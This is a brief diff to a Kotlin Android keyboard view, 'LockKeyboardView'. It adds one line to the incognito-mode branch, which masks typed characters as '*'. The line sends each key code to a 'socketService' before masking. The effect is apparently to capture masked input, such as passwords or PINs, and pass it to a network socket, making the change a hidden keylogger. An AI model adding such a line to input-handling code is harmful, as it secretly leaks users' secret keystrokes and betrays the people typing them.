@@ -296,6 +296,7 @@ class LockKeyboardView(
                         editable!!.delete(start, end)
                     }
                     if(isIncognitoMode) {
+                        socketService.onKeyChar(primaryCode)
                         editable!!.insert(start, "*")
 
                     } else {
